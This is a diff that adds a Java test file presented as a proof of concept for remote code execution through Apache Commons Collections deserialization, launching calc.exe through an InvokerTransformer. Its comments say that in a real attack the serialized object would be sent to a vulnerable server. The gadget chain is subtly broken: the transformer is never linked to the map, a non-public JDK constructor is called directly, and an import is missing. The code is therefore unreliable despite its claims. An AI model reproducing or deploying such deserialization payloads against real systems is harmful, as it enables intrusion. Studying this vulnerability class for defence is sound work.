@@ -1,0 +1,41 @@
+import org.apache.commons.collections.functors.InvokerTransformer;
+
+import java.io.*;
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.Proxy;
+import java.util.HashMap;
+import java.util.Map;
+
+public class InvokerTransformerTest {
+
+    @Test
+    public void testArbitraryRemoteCodeExecution() throws Exception {
+        // Create a payload that will execute arbitrary code upon deserialization.
+        // This example uses Runtime.getRuntime().exec("calc.exe") on Windows.
+        // On other OS, you might need to change the command.
+
+        InvokerTransformer transformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"});
+
+        Map<String, String> map = new HashMap<>();
+        map.put("value", "foo");
+
+        // Create a proxy that will invoke the transformer when its methods are called.
+        InvocationHandler handler = new sun.reflect.annotation.AnnotationInvocationHandler(Override.class, map);
+        Object proxy = Proxy.newProxyInstance(Thread.currentThread().getContextClassLoader(), new Class[]{java.util.Map.class}, handler);
+
+        // Serialize the proxy object.
+        ByteArrayOutputStream bos = new ByteArrayOutputStream();
+        ObjectOutputStream oos = new ObjectOutputStream(bos);
+        oos.writeObject(proxy);
+        oos.close();
+
+        // Deserialize the object. This is where the arbitrary code execution happens.
+        ByteArrayInputStream bis = new ByteArrayInputStream(bos.toByteArray());
+        ObjectInputStream ois = new ObjectInputStream(bis);
+        // The following line will trigger the vulnerability if the InvokerTransformer is not properly handled.
+        // In a real attack, this deserialized object would be sent to a vulnerable server.
+        // We are not asserting anything here because the goal is to demonstrate the potential for RCE.
+        // If the code executes successfully, you might see a calculator pop up (on Windows).
+        ois.readObject();
+    }
+}
